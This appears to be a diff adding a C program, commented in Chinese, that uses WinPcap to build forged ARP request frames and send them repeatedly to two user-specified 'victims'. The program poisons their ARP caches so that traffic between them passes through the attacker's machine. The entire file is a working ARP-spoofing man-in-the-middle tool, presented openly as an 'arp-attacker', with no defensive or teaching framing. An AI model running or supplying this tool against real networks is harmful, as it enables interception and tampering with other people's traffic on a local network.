@@ -1,0 +1,197 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <pcap.h>
+
+
+void pktbuild(u_char* packet, int *smac, int *sip, int *dmac, int* dip);
+
+int main(int argc, char **argv)
+{
+	pcap_if_t* alldevs;			//网卡列表
+	pcap_if_t* d;				//选中的网卡
+	int i = 0;					//全局计数变量
+	int inum;					//定位选中的网卡
+	u_char* packet1[100];		//arp帧包1
+	u_char* packet2[100];		//arp帧包2
+
+	pcap_t *fp;					//启用网卡后的句柄
+	char errbuf[PCAP_ERRBUF_SIZE];		//错误缓冲区
+	int flood;							//发送包的数量
+
+	int self_mac[6];		//攻击者自己的mac地址
+	int victim1_ip[4];		//受害者1的ip
+	int victim1_mac[6];		//受害者1的mac地址
+	int victim2_ip[4];		//受害者2的ip
+	int victim2_mac[6];		//受害者2的mac地址
+
+	printf("the arp-attacker starts...\n");
+
+	/* 检索设备列表 */
+	if (pcap_findalldevs(&alldevs, errbuf) == -1)
+	{
+		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
+		exit(1);
+	}
+	printf("请在以下网卡中选择一个使用:\n");
+	
+	/* 打印网卡列表 */
+	for (d = alldevs; d; d = d->next)
+	{
+		printf("%d. %s", ++i, d->name);
+		if (d->description)
+			printf(" (%s)\n", d->description);
+		else
+			printf(" (No description available)\n");
+	}
+
+	if (i == 0)
+	{  //没有扫描到网卡
+		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
+		return -1;
+	}
+
+	printf("Enter the interface number (1-%d) to use: ", i);
+	scanf_s("%d", &inum);
+
+	/* 检查用户输入是否有效 */
+	if (inum < 1 || inum > i)
+	{
+		printf("\nAdapter number out of range.\n");
+
+		/* 释放所有网卡 */
+		pcap_freealldevs(alldevs);
+		return -1;
+	}
+
+	/* 跳到用户选中的网卡 */
+	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);
+
+	/* 打开用户选中的网卡适配器 */
+	if ((fp = pcap_open_live(d->name,		// name of the device
+							 65536,			// portion of the packet to capture. It doesn't matter in this case 
+							 1,				// promiscuous mode (nonzero means promiscuous)
+							 1000,			// read timeout
+							 errbuf			// error buffer
+							 )) == NULL)
+	{
+		fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", argv[1]);
+		return 2;
+	}
+
+	printf("please input self_mac address like aa-aa-aa-aa-aa-aa: ");
+	scanf_s("%x-%x-%x-%x-%x-%x", &self_mac[0], &self_mac[1], &self_mac[2], &self_mac[3], &self_mac[4], &self_mac[5]);
+
+	printf("please input victim1's ip like 1.1.1.1: ");
+	scanf_s("%d.%d.%d.%d", &victim1_ip[0], &victim1_ip[1], &victim1_ip[2], &victim1_ip[3]);
+
+	printf("please input victim1's mac like aa-aa-aa-aa-aa-aa: ");
+	scanf_s("%x-%x-%x-%x-%x-%x", &victim1_mac[0], &victim1_mac[1], &victim1_mac[2], &victim1_mac[3], &victim1_mac[4], &victim1_mac[5]);
+
+	printf("please input victim2's ip like 1.1.1.1: ");
+	scanf_s("%d.%d.%d.%d", &victim2_ip[0], &victim2_ip[1], &victim2_ip[2], &victim2_ip[3]);
+
+	printf("please input victim2's mac like aa-aa-aa-aa-aa-aa: ");
+	scanf_s("%x-%x-%x-%x-%x-%x", &victim2_mac[0], &victim2_mac[1], &victim2_mac[2], &victim2_mac[3], &victim2_mac[4], &victim2_mac[5]);
+
+	pktbuild(&packet1, self_mac, victim1_ip, victim2_mac, victim2_ip);				//build a arp-packet at &packet
+	pktbuild(&packet2, self_mac, victim2_ip, victim1_mac, victim1_ip);				//build a arp-packet at &packet
+
+	printf("please input the flood(num of packet to send):");
+	scanf_s("%d", &flood);
+
+	/* Send down the packet */
+	for (int i = 0; i < flood; i++)
+	{
+		if (pcap_sendpacket(fp,	// Adapter
+			packet1,				// buffer with the packet
+			100				// size
+			) != 0)
+		{
+			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(fp));
+			return 3;
+		}
+
+		if (pcap_sendpacket(fp,	// Adapter
+			packet2,				// buffer with the packet
+			100				// size
+		) != 0)
+		{
+			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(fp));
+			return 3;
+		}
+
+		Sleep(100);			//发送间隔时间100ms
+	}
+	pcap_close(fp);
+	return 0;
+}
+
+/* build arp-packet */
+void pktbuild(u_char *packet, int *smac, int *sip, int *dmac, int *dip)
+{
+	/* 目的以太网地址 */
+	packet[0] = dmac[0];
+	packet[1] = dmac[1];
+	packet[2] = dmac[2];
+	packet[3] = dmac[3];
+	packet[4] = dmac[4];
+	packet[5] = dmac[5];
+
+	/* 源以太网地址 */
+	packet[6] =  smac[0];
+	packet[7] =  smac[1];
+	packet[8] =  smac[2];
+	packet[9] =  smac[3];
+	packet[10] = smac[4];
+	packet[11] = smac[5];
+
+	/* set arp */
+	packet[12] = 0x08;	//0x0806表示该帧封装ARP包
+	packet[13] = 0x06;
+
+	packet[14] = 0x00;	//硬件类型，值为1表示以太网
+	packet[15] = 0x01;
+
+	packet[16] = 0x08;	//协议类型，值为0x0800表示使用的IP地址
+	packet[17] = 0x00;
+
+	packet[18] = 0x06;	//硬件地址长度为6字节
+	packet[19] = 0x04;	//IP地址长度为4字节
+
+	packet[20] = 0x00;	//表示了ARP操作类型
+	packet[21] = 0x01;	//ARP请求为1，ARP响应为2，RARP请求为3，RARP响应为4
+
+	/* 以太网源地址 */
+	packet[22] = smac[0];
+	packet[23] = smac[1];
+	packet[24] = smac[2];
+	packet[25] = smac[3];
+	packet[26] = smac[4];
+	packet[27] = smac[5];
+
+	/* 源ip地址 */
+	packet[28] = sip[0];
+	packet[29] = sip[1];
+	packet[30] = sip[2];
+	packet[31] = sip[3];
+
+	/* 目的以太网地址 */
+	packet[32] = dmac[0];
+	packet[33] = dmac[1];
+	packet[34] = dmac[2];
+	packet[35] = dmac[3];
+	packet[36] = dmac[4];
+	packet[37] = dmac[5];
+
+	/* 目的ip地址 */
+	packet[38] = dip[0];
+	packet[39] = dip[1];
+	packet[40] = dip[2];
+	packet[41] = dip[3];
+
+	/* Fill the rest of the packet with 0 */
+	for (int i = 42; i < 61; i++)
+	{
+		packet[i] = 0x0;
+	}	
+}
